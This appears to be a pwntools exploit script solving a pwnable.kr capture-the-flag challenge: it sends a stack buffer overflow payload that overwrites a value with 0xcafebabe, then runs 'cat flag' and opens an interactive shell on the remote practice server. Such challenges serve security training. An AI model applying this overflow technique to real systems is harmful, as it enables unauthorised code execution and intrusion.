from pwn import *
r = remote('pwnable.kr', 10003)
payload = b'a' * 0x34 + p32(0xcafebabe)
r.sendline(payload)
r.sendline(b'cat flag')
r.interactive()
